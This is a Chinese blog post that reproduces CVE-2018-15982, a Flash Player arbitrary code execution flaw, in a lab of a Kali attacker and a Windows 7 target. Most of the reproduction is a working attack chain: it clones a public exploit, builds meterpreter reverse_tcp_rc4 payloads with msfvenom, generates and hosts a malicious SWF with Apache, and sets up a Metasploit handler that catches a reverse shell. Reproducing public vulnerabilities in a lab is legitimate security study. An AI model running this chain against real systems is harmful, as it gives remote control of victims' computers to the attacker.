---
title: CVE-2018-15982任意代码执行漏洞复现
date: 2019-08-8 15:20:00
author: dylan
top: false
cover: false
password: 
categories: web安全
tags: 
    - 漏洞复现
    - CVE-2018-15982
    - 任意代码执行
---
# 0x01 漏洞概述
2018年11月29日，360高级威胁应对团队在全球范围内第一时间发现一起针对俄罗斯的APT攻击行动，通过一份俄文内容的医院员工问卷文档，携带最新的Flash 0day漏洞和具有自毁功能的专属木马程序，该漏洞（CVE-2018-15982）允许攻击者恶意制作的Flash对象在受害者的计算机上执行代码，从而获取对系统命令行的访问权限。

***
# 0x02 影响版本

* AdobeFlash Player <= 31.0.0.153
* AdobeFlash Player Installer<= 31.0.0.108
（不包括AdobeFlash Player 32.0.0.101、AdobeFlash Player Installer 31.0.0.122）

***
# 0x03 漏洞复现
## 复现环境
攻击机：Linux kali (192.168.159.136)
靶机：windows7 x64（192.168.159.133）
Flash版本: Adobe Flash Player ActiveX_29.0.0.155
链接: [Adobe Flash Player ActiveX_29.0.0.155](https://pan.baidu.com/s/1S5hbsREkhWv_b1zyn-rQUg)
提取码: c8sf 
(注意：断网安装)

## 复现过程
**kali:**

**git 漏洞POC**
`git clone https://github.com/Ridter/CVE-2018-15982_EXP`

msfvenom生成两个payload程序（32位和64位）
`msfvenom -p windows/meterpreter/reverse_tcp_rc4 RC4PASSWORD=ZALE LPORT=4444 LHOST=192.168.159.136 -f raw > 86.bin`

`msfvenom -p windows/meterpreter/reverse_tcp_rc4 RC4PASSWORD=ZALE LPORT=4444 LHOST=192.168.159.136 -f raw > 64.bin`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808144511.png)

**生成POC**
将生成的两个`.bin`文件copy进下载的POC文件夹，
并cd进去，执行.py文件生成POC
```
cp *.bin CVE-2018-15982_EXP/
cd CVE-2018-15982_EXP/
python CVE_2018_15982.py -i 86.bin -I 64.bin
```

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808144751.png)

开启apache服务，并将生成的两个文件copy进html目录

```
systemctl start apache2.service
cp index.html /var/www/html
cp exploit.swf /var/www/html
```

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808145202.png)

**设置msf监听**

启动msf

`msfconsole`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808145436.png)

```
use exploit/multi/handler 
set payload windows/meterpreter/reverse_tcp_rc4
set lport 4444
set lhost 192.168.159.136
set RC4PASSWORD zale
exploit
```

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808145507.png)

**靶机:**

使用靶机访问`192.168.159.136/index.html`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808150229.png)

成功反弹session
![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808145952.png)

`sessions -l`
显示会话列表

`sessions id`
选择指定id会话
![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808150006.png)

***
# 参考文章
[CVE-2018-15982任意代码执行漏洞复现](https://www.freebuf.com/column/197760.html)